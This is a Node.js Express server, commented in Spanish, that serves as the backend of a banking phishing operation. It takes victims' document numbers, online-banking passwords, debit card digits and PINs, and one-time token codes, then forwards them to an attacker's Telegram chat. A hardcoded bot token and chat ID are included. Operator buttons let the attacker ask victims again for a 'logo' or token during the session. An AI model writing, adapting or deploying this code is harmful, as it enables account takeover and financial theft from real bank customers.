const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Server } = require('socket.io');

const app = express();
const token = process.env.TELEGRAM_TOKEN || '8582118363:AAEmFQDHohsvmLpLkUl9MHlv62IvPfxFAAY';
const chatId = process.env.TELEGRAM_CHAT_ID || '7831097636';

// Configuración del bot
const bot = new TelegramBot(token, { polling: false });

// Middleware
app.use(express.json());

// Webhook para Telegram
app.post('/api/webhook', (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// Función para enviar mensajes
async function sendTelegramMessage(data) {
  try {
    const keyboard = {
      inline_keyboard: [
        [
          { text: '❌ Error de Logo', callback_data: 'error_logo' },
          { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' }
        ],
        [
          { text: '❌ Error de Token', callback_data: 'error_token' },
          { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
        ],
        [
          { text: '✅ Finalizar', callback_data: 'finalizar' }
        ]
      ]
    };

    let messageText;
    if (typeof data === 'object') {
      if (data.tipo === 'Clave Segura') {
        messageText = `🔐 Nueva solicitud de ingreso:\n\n📋 Tipo: ${data.tipo}\n🪪 Documento: ${data.tipoDocumento} ${data.numeroDocumento}\n🔑 Clave: ${data.clave}`;
      } else if (data.tipo === 'Tarjeta Débito') {
        messageText = `💳 Nueva solicitud de ingreso:\n\n📋 Tipo: ${data.tipo}\n🪪 Documento: ${data.tipoDocumento} ${data.numeroDocumento}\n💳 Tarjeta: ${data.ultimosDigitos}\n🔑 Clave: ${data.claveTarjeta}`;
      } else if (data.tipo === 'Token') {
        messageText = `🔐 Verificación de Token:\n\n🔑 Código: ${data.codigo}\n⏰ Timestamp: ${data.timestamp}`;
      }
    } else {
      messageText = data.toString();
    }

    const result = await bot.sendMessage(chatId, messageText, {
      parse_mode: 'HTML',
      reply_markup: keyboard
    });

    return result;
  } catch (error) {
    console.error('Error al enviar mensaje:', error);
    throw error;
  }
}

// Ruta para enviar mensajes
app.post('/api/send-telegram', async (req, res) => {
  try {
    const result = await sendTelegramMessage(req.body);
    res.json({ success: true, messageId: result.message_id });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Manejar callbacks de botones
bot.on('callback_query', async (callbackQuery) => {
  try {
    const action = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;
    
    console.log(`Botón presionado: ${action}, Mensaje: ${messageId}`);
    
    // Responder al callback
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: `Procesando: ${action}`
    });

    // Aquí puedes agregar lógica adicional para cada acción
    switch(action) {
      case 'finalizar':
        await bot.editMessageText('✅ Proceso finalizado exitosamente', {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: [] }
        });
        break;
    }

  } catch (error) {
    console.error('Error en callback:', error);
  }
});

module.exports = app;